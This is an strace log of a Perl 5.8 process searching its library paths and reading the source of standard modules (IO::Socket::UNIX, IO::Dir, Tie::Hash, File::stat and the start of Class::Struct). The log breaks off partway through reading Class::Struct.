7464  07:18:53.296707 brk(0x82bd000)    = 0x82bd000
7464  07:18:53.296723 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
7464  07:18:53.297783 _llseek(6, 1386, [1386], SEEK_SET) = 0
7464  07:18:53.297813 _llseek(6, 0, [1386], SEEK_CUR) = 0
7464  07:18:53.297824 close(6)          = 0
7464  07:18:53.297878 stat64("/etc/perl/IO/Dir.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.297894 stat64("/etc/perl/IO/Dir.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.297907 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.297920 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.297938 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.297951 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.297983 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.298024 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.298054 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.298083 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.298096 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.298108 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
7464  07:18:53.298129 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.298143 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.298155 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.298174 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
7464  07:18:53.299255 stat64("/etc/perl/Tie/Hash.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299369 stat64("/etc/perl/Tie/Hash.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299426 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299460 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299488 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299511 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299528 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299539 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299552 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299564 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299577 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299590 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299603 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.299616 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
7464  07:18:53.299649 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.299693 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.299704 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.299740 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
7464  07:18:53.300044 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
7464  07:18:53.300612 read(8, "", 4096) = 0
7464  07:18:53.300628 close(8)          = 0
7464  07:18:53.300705 stat64("/etc/perl/File/stat.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300758 stat64("/etc/perl/File/stat.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300773 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300785 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300799 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300812 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300826 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300838 stat64("/usr/lib/perl5/File/stat.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300851 stat64("/usr/share/perl5/File/stat.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300863 stat64("/usr/share/perl5/File/stat.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300881 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300893 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300907 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.300919 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
7464  07:18:53.300940 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.300955 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.300966 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.300983 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
7464  07:18:53.301430 stat64("/etc/perl/Class/Struct.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301448 stat64("/etc/perl/Class/Struct.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301462 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301475 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301489 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301502 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301516 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301528 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301541 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301553 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301566 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301579 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301592 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.301605 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
7464  07:18:53.301627 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
7464  07:18:53.301655 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c388) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.301707 _llseek(10, 0, [0], SEEK_CUR) = 0
7464  07:18:53.301727 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = 